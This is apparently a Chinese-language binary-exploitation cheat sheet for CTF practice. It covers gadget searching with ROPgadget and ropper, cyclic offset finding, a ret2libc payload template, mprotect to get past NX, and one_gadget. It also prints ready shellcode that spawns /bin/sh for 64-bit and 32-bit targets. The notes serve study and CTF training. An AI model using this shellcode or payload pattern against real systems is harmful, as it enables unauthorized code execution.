4. Tricks

  • 搜索gadgets/搜索rop链：ROPgadget --binary a.out --only 'pop|ret' | grep 'eax'

  • ropper ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "syscall"

  • 在elf中搜索字符串：ROPgadget --binary a.out --string '/bin/sh'

  • 计算偏移量：

    cyclic 100 生成有规律的字符串

    cyclic -l abcd 根据返回值计算其所在位置

    • 编写exp时如果涉及到函数调用，要记得在调用函数和参数之间加返回值（可以是占位符），如：

      payload = 'a' * 112 + system_addr + 'aaaa' + binsh_addr

      这主要是因为我们通过栈溢出改变函数返回值的方式，其过程类似于执行了call system，但在执行call执行时，其内部会将下一个指令的地址入栈，待函数执行完毕后执行ret指令时，会从栈顶pop返回值。因此需要在修改的函数地址后面跟一个返回值，否则栈上构造的参数会被ret指令读取

    • read(0,&buff,len) 如果从命令行读取，则fd = 0

    • write(1,&buff,len) 如果输出到命令行，则fd = 1

    • 当遇到nx保护又想执行shellcode时，可以调用mprotect或mmap函数更改bss段的权限

    • 查看程序符号表入口（可查看自定义名称的函数） objdump -t level5

    • 查看程序got表 objdump -T level5

    • libc搜索网站和工具（搜索后12位）：LibcSearcher、DynELF、https://libc.blukat.me/

    • onegadget： 一个神奇的工具 用来找libc中能一个gadget就get到shell的偏移

      one_gadget /lib/x86_64-linux-gnu/libc.so.6

    • 没有开启PIE时，64位程序从0x400000开始

    • 翻译汇编：
      sub_esp_jmp = asm('sub esp, 0x28;jmp esp')

    • 一种调试方法：

      def DEBUG(cmd):
	raw_input("DEBUG: ")
	gdb.attach(io, cmd) 
	
DEBUG('b *0x1234 \n c') #在0x123处下断点，然后继续执行至断点处

    • byte ptr [eax]

      以eax为地址，取一个字节的数据，并扩展到32位

    • 64位短shellcode

      • shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"（23字节）

      • \x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05(24字节，好用)

    • 32位短shellcode

      • shellcode = "\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"(23字节 好用)

    • retn指令 = pop eip 将栈上的地址赋值给eip
